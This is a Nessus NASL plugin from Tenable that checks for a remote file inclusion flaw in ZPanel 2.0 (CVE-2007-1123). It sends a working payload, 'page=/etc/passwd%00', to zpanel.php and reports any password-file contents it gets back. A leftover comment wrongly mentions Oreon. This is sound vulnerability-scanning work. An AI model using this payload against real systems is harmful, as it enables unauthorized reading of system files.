#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(24698);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-1123", "CVE-2005-0793");
  script_bugtraq_id(22683);
  script_xref(name:"OSVDB", value:"33498");
  script_xref(name:"OSVDB", value:"14804");

  script_name(english:"ZPanel 2.0 Multiple Script Remote File Inclusion");
  script_summary(english:"Tries to read a local file with ZPanel");

  script_set_attribute(
    attribute:"synopsis",
    value:string(
      "The remote web server contains a PHP application that is susceptible\n",
      "to remote file include attacks. "
    )
  );
  script_set_attribute(
    attribute:"description", 
    value:string(
      "The remote host is running ZPanel, an open-source hosting control\n",
      "panel written in PHP.\n",
      "\n",
      "The installation of ZPanel on the remote host fails to sanitize user-\n",
      "supplied input to the 'page' and 'body' parameters of the 'zpanel.php'\n",
      "and 'templates/ZPanelV2/template.php' scripts respectively before\n",
      "using it to include PHP code.  An unauthenticated attacker can exploit\n",
      "this issue to view arbitrary files or to execute arbitrary PHP code on\n",
      "the remote host, subject to the privileges of the web server user id. \n",
      "\n",
      "Note that exploitation of this issue via 'zpanel.php' does not require\n",
      "that PHP's 'register_globals' setting be enabled."
    )
  );
  script_set_attribute(
    attribute:"solution", 
    value:"Unknown at this time."
  );
  script_set_attribute(
    attribute:"cvss_vector", 
    value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
  );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/zpanel", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/etc/passwd";
  r = http_send_recv3(method:"GET", port: port, 
    item:string(dir, "/zpanel.php?", "page=", file, "%00"));
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like Oreon's lang/index.php script and...
    "ZPanel" >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(", file, "\\0.php): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
  )
  {
    contents = NULL;
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
    {
      contents = res;
      if ("bodybox_r2_c1.gif" >< contents) contents = strstr(contents, "bodybox_r2_c1.gif");
      if ("</td>" >< contents) contents = contents - strstr(contents, "</td>");
      if ("<td>" >< contents) contents = strstr(contents, "<td>") - "<td>";
      if ("     " >< contents) contents = strstr(contents, "     ") - "     ";
      contents = ereg_replace(pattern:"^ +(.+)$", replace:"\1", string:contents);
    }

    if (contents && egrep(string:contents, pattern:"root:.*:0:[01]:"))
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus was\n",
        "able to read from the remote host :\n",
        "\n",
        contents
      );
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
